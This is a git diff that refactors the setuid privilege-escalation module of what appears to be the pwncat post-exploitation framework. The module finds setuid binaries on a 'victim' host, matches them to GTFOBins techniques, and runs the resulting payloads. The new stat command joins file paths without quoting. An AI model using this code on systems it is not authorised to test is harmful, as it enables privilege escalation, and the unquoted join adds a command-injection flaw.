@@ -7,6 +7,7 @@ import os
 from colorama import Fore, Style
 import io
 
+import pwncat
 from pwncat.privesc.base import Method, PrivescError, Technique
 from pwncat.gtfobins import Binary, Stream, Capability, MethodWrapper, BinaryNotFound
 from pwncat.file import RemoteBinaryPipe
@@ -26,18 +27,15 @@ class SetuidMethod(Method):
 
     def find_suid(self):
 
-        current_user = self.pty.whoami()
+        current_user: "pwncat.db.User" = pwncat.victim.current_user
 
-        # Only re-run the search if we haven't searched as this user yet
-        if current_user in self.users_searched:
+        # We've already searched for SUID binaries as this user
+        if len(current_user.suid):
             return
-
-        # Note that we already searched for binaries as this user
-        self.users_searched.append(current_user)
 
         # Spawn a find command to locate the setuid binaries
         files = []
-        with self.pty.subprocess(
+        with pwncat.victim.subprocess(
             "find / -perm -4000 -print 2>/dev/null", mode="r", no_job=True
         ) as stream:
             util.progress("searching for setuid binaries")
@@ -45,7 +43,7 @@ class SetuidMethod(Method):
                 path = path.strip().decode("utf-8")
                 util.progress(
                     (
-                        f"searching for setuid binaries as {Fore.GREEN}{current_user}{Fore.RESET}: "
+                        f"searching for setuid binaries as {Fore.GREEN}{current_user.name}{Fore.RESET}: "
                         f"{Fore.CYAN}{os.path.basename(path)}{Fore.RESET}"
                     )
                 )
@@ -53,17 +51,17 @@ class SetuidMethod(Method):
 
         util.success("searching for setuid binaries: complete", overlay=True)
 
-        for path in files:
-            user = (
-                self.pty.run(f"stat -c '%U' {shlex.quote(path)}")
-                .strip()
-                .decode("utf-8")
-            )
-            if user not in self.suid_paths:
-                self.suid_paths[user] = []
-            # Only add new binaries
-            if path not in self.suid_paths[user]:
-                self.suid_paths[user].append(path)
+        with pwncat.victim.subprocess(
+            f"stat -c '%U' {' '.join(files)}", mode="r", no_job=True
+        ) as stream:
+            for file, user in zip(files, stream):
+                user = user.strip().decode("utf-8")
+                binary = pwncat.db.SUID(path=file,)
+                pwncat.victim.host.suid.append(binary)
+                pwncat.victim.users[user].owned_suid.append(binary)
+                current_user.suid.append(binary)
+
+        pwncat.victim.session.commit()
 
     def enumerate(self, caps: Capability = Capability.ALL) -> List[Technique]:
         """ Find all techniques known at this time """
@@ -72,15 +70,16 @@ class SetuidMethod(Method):
         self.find_suid()
 
         known_techniques = []
-        for user, paths in self.suid_paths.items():
-            for path in paths:
-                try:
-                    binary = self.pty.gtfo.find_binary(path, caps)
-                except BinaryNotFound:
-                    continue
+        for suid in pwncat.victim.host.suid:
+            try:
+                binary = pwncat.victim.gtfo.find_binary(suid.path, caps)
+            except BinaryNotFound:
+                continue
 
-                for method in binary.iter_methods(path, caps, Stream.ANY):
-                    known_techniques.append(Technique(user, self, method, method.cap))
+            for method in binary.iter_methods(suid.path, caps, Stream.ANY):
+                known_techniques.append(
+                    Technique(suid.owner.name, self, method, method.cap)
+                )
 
         return known_techniques
 
@@ -90,14 +89,16 @@ class SetuidMethod(Method):
         method = technique.ident
 
         # Build the payload
-        payload, input_data, exit_cmd = method.build(shell=self.pty.shell, suid=True)
+        payload, input_data, exit_cmd = method.build(
+            shell=pwncat.victim.shell, suid=True
+        )
 
         # Run the start commands
-        # self.pty.process(payload, delim=False)
-        self.pty.run(payload, wait=False)
+        # pwncat.victim.process(payload, delim=False)
+        pwncat.victim.run(payload, wait=False)
 
         # Send required input
-        self.pty.client.send(input_data.encode("utf-8"))
+        pwncat.victim.client.send(input_data.encode("utf-8"))
 
         return exit_cmd  # remember how to close out of this privesc
 
@@ -112,7 +113,7 @@ class SetuidMethod(Method):
             mode += "b"
 
         # Send the read payload
-        pipe = self.pty.subprocess(
+        pipe = pwncat.victim.subprocess(
             payload,
             mode,
             data=input_data.encode("utf-8"),
@@ -138,7 +139,7 @@ class SetuidMethod(Method):
             mode += "b"
 
         # Send the read payload
-        pipe = self.pty.subprocess(
+        pipe = pwncat.victim.subprocess(
             payload,
             mode,
             data=input_data.encode("utf-8"),
